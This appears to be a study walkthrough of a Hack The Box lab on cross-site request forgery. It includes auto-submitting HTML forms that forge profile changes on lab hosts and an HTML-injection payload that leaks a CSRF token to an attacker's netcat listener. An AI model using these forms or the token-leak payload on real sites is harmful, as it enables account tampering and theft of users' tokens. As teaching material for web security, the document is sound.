# Cross-Site Request Forgery (CSRF or XSRF)
An attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated.

A web application is vulnerable to CSRF attacks when:
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:
- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued
## Cross-Site Request Forgery Example
If we login to an account and run Burp, then capture the request sent when we try to update our profile, we may notice no anti-CSRF token in the update-profile request.
![Burp Suite showing a POST request to update profile with email, telephone, and country parameters.](https://academy.hackthebox.com/storage/modules/153/28.png)

Let's try executing a CSRF attack against our account (Ela Stienen) that will change her profile details by simply visiting another website (while logged in to the target application).

First, create and serve the below HTML page. Save it as `notmalicious.html`
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

If you are wondering how we ended up with the above form, please see the image below. ![HTML form with hidden inputs for email, telephone, and country, and a script to auto-submit.](https://academy.hackthebox.com/storage/modules/153/29.png)
We can serve the page above from our attacking machine as follows:
```bash
python -m http.server 1337
```

While still logged in as a user, open a new tab and visit the page you are serving from your attacking machine `http://IP-ADDRESS:1337/notmalicious.html`. 

You will notice that the users profile details will change to the ones we specified in the HTML page we are serving.

Our assumption that there is no CSRF protection in the application was correct. We were able to change the users profile details via a cross-site request.
- We can now use the malicious web page we crafted to execute CSRF attacks against other users.
# Cross-Site Request Forgery (GET-based)
Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.
## Examples
Capture another account update request with Burp, this time it will have a CSRF token in the `GET` request:

![Burp Suite showing a GET request to save user data with parameters for telephone, country, CSRF token, and email.](https://academy.hackthebox.com/storage/modules/153/31.png)

Let us simulate an attacker on the local network that sniffed the abovementioned request and wants to deface the users profile through a CSRF attack.

First, create and serve the below HTML page. Save it as `notmalicious_get.html`
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
- Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.

You can serve the page above from your attacking machine as follows:
```bash
python -m http.server 1337
```

While still logged in as the user, open a new tab and visit the page you are serving from your attacking machine `http://IP-ADDRESS:1337/notmalicious_get.html`. 
- You will notice that the users profile details will change to the ones we specified in the HTML page we are serving.
# Cross-Site Request Forgery (POST-based)
CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.
## Example
After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

If we click on the "Delete" button, we will get redirected to `/app/delete/<your-email>`
![Confirmation prompt to delete account with email julie.rogers@example.com.](https://academy.hackthebox.com/storage/modules/153/36.png)

Notice that the email is reflected on the page. Let us try inputting some HTML into the _email_ value, such as:
```html
<h1>h1<u>underline<%2fu><%2fh1>
```
![Confirmation prompt to delete account with email h1underline.](https://academy.hackthebox.com/storage/modules/153/37.png)

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.
![HTML source code showing an underlined heading and hidden CSRF input.](https://academy.hackthebox.com/storage/modules/153/39.png)

Let us first instruct Netcat to listen on port 8000, as follows:
```bash
nc -nlvp 8000
```

Now we can get the CSRF token via sending the below payload to our victim:
```html
<table%20background='%2f%2fIP-ADDRESS:PORT%2f
```

If we open a new tab as the user and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`, we will notice a connection being made on our `nc` listener that leaks the CSRF token.
> Note: This attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!

# NOTES!
If a web application was utilizing SSL encryption, an attacker would still be able to alter a uesrs profile through CSRF (GET-based).

If a web application was utilizing secure cookies, an attacker would still be able to leak the CSRF token (POST-based).
